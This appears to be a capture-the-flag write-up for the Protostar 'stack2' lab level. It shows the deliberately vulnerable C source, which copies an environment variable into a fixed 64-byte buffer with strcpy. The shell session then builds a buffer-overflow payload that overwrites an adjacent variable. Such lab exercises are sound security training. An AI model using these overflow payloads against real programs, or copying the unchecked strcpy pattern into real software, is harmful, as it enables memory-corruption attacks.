#### Stack2

###### About

Stack2 looks at environment variables, and how they can be set.

This level is at ``/opt/protostar/bin/stack2``

``stack2.c``

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```

###### Solution

```sh
user@protostar:/opt/protostar/bin$ export GREENIE=`python -c "print 'A'*68"`
```

```sh
user@protostar:/opt/protostar/bin$ ./stack2
Try again, you got 0x41414141
user@protostar:/opt/protostar/bin$
```

```sh
user@protostar:/opt/protostar/bin$ export GREENIE=`python -c "print 'A'*64 +'\x0a\x0d\x0a\x0d'"`
```

```sh
user@protostar:/opt/protostar/bin$ echo $GREENIE
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
user@protostar:/opt/protostar/bin$
```

```sh
user@protostar:/opt/protostar/bin$ ./stack2
you have correctly modified the variable
user@protostar:/opt/protostar/bin$
```

